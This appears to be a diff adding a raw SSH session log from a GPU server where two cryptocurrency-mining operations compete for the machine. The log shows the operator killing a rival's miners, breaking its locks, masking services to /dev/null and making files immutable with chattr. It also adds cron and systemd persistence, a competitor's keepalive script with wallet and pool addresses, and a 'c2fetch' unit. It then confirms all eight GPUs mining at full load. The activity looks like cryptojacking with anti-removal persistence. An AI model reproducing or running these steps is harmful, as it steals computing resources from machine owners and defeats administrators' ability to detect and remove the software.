@@ -1,0 +1,132 @@
+Warning: Permanently added '123.184.7.135' (ED25519) to the list of known hosts.
+### META 2026-11-24T23:36:40Z
+g0023
+### DIAG
+lrwxrwxrwx 1 root root         9 Nov 25 07:29 /etc/systemd/system/ul-card@.service -> /dev/null
+-rw-r--r-- 1 root root       227 Nov 25 07:31 /etc/systemd/system/ul-guardloop.service
+-rwxr-xr-x 1 root root        17 Nov 25 07:29 /root/ul_plant/keep.sh
+---------- 1 root root 127812624 Nov 25 07:10 /root/ul_plant/krig/krig-miner
+
+/opt/plh/:
+total 20
+drwxr-xr-x  2 root root 4096 Nov 25 07:29 .
+drwxr-xr-x 19 root root 4096 Nov 25 06:40 ..
+-rwxr-xr-x  1 root root  803 Nov 25 07:29 keepalive.sh
+-rwxr-xr-x  1 root root  550 Nov 25 05:32 plh-card.sh
+-rwxr-xr-x  1 root root   96 Nov 25 07:29 setsid-guard.sh
+lsattr: Operation not supported While reading flags on /etc/systemd/system/ul-card@.service
+--------------e------- /etc/systemd/system/ul-guardloop.service
+----i---------e------- /root/ul_plant/keep.sh
+----i---------e------- /root/ul_plant/krig/krig-miner
+-- ps competitors
+ 973563  972316   0 /bin/bash /opt/plh/setsid-guard.sh
+1120102       1   0 /bin/bash -c while true; do /root/ul_plant/keep.sh; sleep 60; done
+1120588 3816974  -5 /opt/arsenal/miners/krig/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool
+1120605 3816943  -5 /opt/arsenal/miners/krig/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool
+1120608 3816933  -5 /opt/arsenal/miners/krig/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool
+1120611 3816966  -5 /opt/arsenal/miners/krig/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool
+1120614 3816998  -5 /opt/arsenal/miners/krig/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool
+1120616 3816950  -5 /opt/arsenal/miners/krig/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool
+1120620 3816959  -5 /opt/arsenal/miners/krig/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool
+1120654 3816986  -5 /opt/arsenal/miners/krig/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pearl-sg1.luckypool
+1848084       1   0 python3 /opt/plhllm/srv.py
+3816933       1  -5 /bin/bash /opt/plh/plh-card.sh 0
+3816943       1  -5 /bin/bash /opt/plh/plh-card.sh 1
+3816950       1  -5 /bin/bash /opt/plh/plh-card.sh 2
+3816959       1  -5 /bin/bash /opt/plh/plh-card.sh 3
+-- timers
+NEXT                        LEFT               LAST                        PASSED             UNIT                           ACTIVATES
+Wed 2026-11-25 09:16:16 CST 1h 39min left      Wed 2026-11-25 03:06:21 CST 4h 30min ago       ua-timer.timer                 ua-timer.service
+Wed 2026-11-25 11:45:13 CST 4h 8min left       Tue 2026-11-24 11:45:14 CST 19h ago            update-notifier-download.timer update-notifier-download.service
+Wed 2026-11-25 12:12:14 CST 4h 35min left      Tue 2026-11-24 12:12:14 CST 19h ago            systemd-tmpfiles-clean.timer   systemd-tmpfiles-clean.service
+Wed 2026-11-25 15:12:45 CST 7h left            Wed 2026-11-25 00:49:10 CST 6h ago             motd-news.timer                motd-news.service
+Wed 2026-11-25 21:26:22 CST 13h left           Wed 2026-11-25 07:09:59 CST 26min ago          fwupd-refresh.timer            fwupd-refresh.service
+Thu 2026-11-26 00:00:00 CST 16h left           Wed 2026-11-25 00:00:00 CST 7h ago             dpkg-db-backup.timer           dpkg-db-backup.service
+Thu 2026-11-26 00:00:00 CST 16h left           Wed 2026-11-25 00:00:00 CST 7h ago             logrotate.timer                logrotate.service
+-- crontab
+*/2 * * * * /usr/local/node_exporter/get_hardware_info_v3 high >> /var/log/hardware_info_high.log 2>&1
+0 * * * * /usr/local/node_exporter/get_hardware_info_v3 middle >> /var/log/hardware_info_middle.log 2>&1
+0 1 * * * /usr/local/node_exporter/get_hardware_info_v3 low >> /var/log/hardware_info_low.log 2>&1
+@reboot /usr/local/node_exporter/get_hardware_info_v3 once_boot >> /var/log/hardware_info_boot.log 2>&1
+31 21 * * * "/root/.acme.sh"/acme.sh --cron --home "/root/.acme.sh" > /dev/null
+0 2 * * * /ssd/vendors/QD_GLAD/npa_bicm/mysql/backup/scripts/backup.sh >>/ssd/vendors/QD_GLAD/npa_bicm/mysql/backup/scripts/backup.log 2>&1
+@reboot /opt/plh/keepalive.sh
+*/5 * * * * /opt/plh/keepalive.sh
+@reboot /root/ul_plant/keep.sh
+* * * * * /root/ul_plant/keep.sh
+-- plh-card.sh
+#!/bin/bash
+N="$1"
+LOG=/var/log/plh-g$N.log
+exec >>"$LOG" 2>&1
+echo "=== start $(date -u +%FT%TZ) card=$N pid=$$"
+while true; do
+  /opt/arsenal/miners/krig/krig-miner --coin pearl \
+    --url stratum+ssl://prl-sg.kryptex.network:8048 \
+    --url stratum+tcp://pool.pearlhash.xyz:9000 \
+    --url stratum+ssl://pearl-sg1.luckypool.io:3360 \
+    --user prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l/plh-123-184-7-135-g$N \
+    --password x -d $N --api-port $((1300+N))
+  echo "=== miner exit rc=$? $(date -u +%FT%TZ)"
+  sleep 15
+done
+-- keepalive
+#!/bin/bash
+W=prl1p6grd5zlsxdzzja63uqfld2nj9gulh37evhdnkekxx2rguhqdf4vsvd6x8l
+pkill -9 -f '/root/ul_plant/krig/' 2>/dev/null
+for i in 0 1 2 3 4 5 6 7; do systemctl is-active -q ul-card@$i && systemctl stop ul-card@$i 2>/dev/null; done
+for n in 0 1 2 3 4 5 6 7; do
+  systemctl is-enabled -q plh-card@$n || systemctl enable plh-card@$n >/dev/null 2>&1
+  if ! pgrep -f -- "--user $W/plh-123-184-7-135-g$n " >/dev/null 2>&1; then
+    systemctl restart plh-card@$n >/dev/null 2>&1
+  fi
+done
+# exactly one per card guard: if >1 for a card, leave the oldest
+for n in 0 1 2 3 4 5 6 7; do
+  c=$(pgrep -fc -- "--user $W/plh-123-184-7-135-g$n " 2>/dev/null)
+  if [ "${c:-0}" -gt 1 ]; then pkill -9 -f -- "--user $W/plh-123-184-7-135-g$n " 2>/dev/null; systemctl restart plh-card@$n >/dev/null 2>&1; fi
+done
+exit 0
+-- c2fetch
+-- guard unit
+### BREAK-COMPETITOR-LOCK
+chattr: No such file or directory while trying to stat /etc/systemd/system/plh-guard.service
+chattr: No such file or directory while trying to stat /etc/systemd/system/plh-guard.timer
+chattr: No such file or directory while trying to stat /etc/systemd/system/plh-c2fetch.service
+chattr: Operation not supported while reading flags on /etc/systemd/system/ul-card@.service
+post-break: plh=1 crons=8
+### REASSERT-OURS
+-rwxr-xr-x 1 root root 127812624 Nov 25 07:36 /opt/ul2/krig-miner
+-rwxr-xr-x 1 root root 127812624 Nov 25 07:36 /root/ul_plant/krig/krig-miner
+sed: couldn't edit /etc/systemd/system/ul-card@.service: not a regular file
+chattr: Operation not supported while reading flags on /etc/systemd/system/ul-card@.service
+lsattr: Operation not supported While reading flags on /etc/systemd/system/ul-card@.service
+----i---------e------- /root/ul_plant/keep.sh
+----i---------e------- /opt/plh/plh-card.sh
+AFTER: units=0 ourprocs=8 plh=0
+0, 6327 MiB, 100 %
+1, 6327 MiB, 100 %
+2, 6327 MiB, 100 %
+3, 6327 MiB, 100 %
+4, 6327 MiB, 100 %
+5, 6327 MiB, 100 %
+6, 6327 MiB, 100 %
+7, 6327 MiB, 100 %
+1460290   0 /opt/ul2/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pea
+1460291   0 /opt/ul2/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pea
+1460292   0 /opt/ul2/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pea
+1460293   0 /opt/ul2/krig-miner --coin pearl --url stratum+ssl://prl-sg.kryptex.network:8048 --url stratum+tcp://pool.pearlhash.xyz:9000 --url stratum+ssl://pea
+### WAIT+POOL
+FINAL: units=0 ourprocs=8 plh=0
+size=134213
+SELF_ROWS 9
+ROW ul-t2-123-184-7-135-g3 online valid 139 last 1795563509739 hr None
+ROW ul-t2-123-184-7-135-g1 online valid 148 last 1795563430477 hr None
+ROW ul-t2-123-184-7-135-g2 online valid 152 last 1795563571245 hr None
+ROW ul-t2-123-184-7-135-g0 online valid 144 last 1795563445396 hr None
+ROW ul-t2-123-184-7-135-g6 online valid 165 last 1795563570479 hr None
+ROW ul-t2-123-184-7-135-g7 online valid 133 last 1795563469250 hr None
+ROW ul-t2-123-184-7-135-g5 online valid 162 last 1795563550679 hr None
+ROW ul-t2-123-184-7-135-g4 online valid 149 last 1795563539906 hr None
+ROW ul-t19-123-184-7-135-g7 offline valid 944 last 1795538492391 hr None
+### DONE 2026-11-24T23:39:35Z
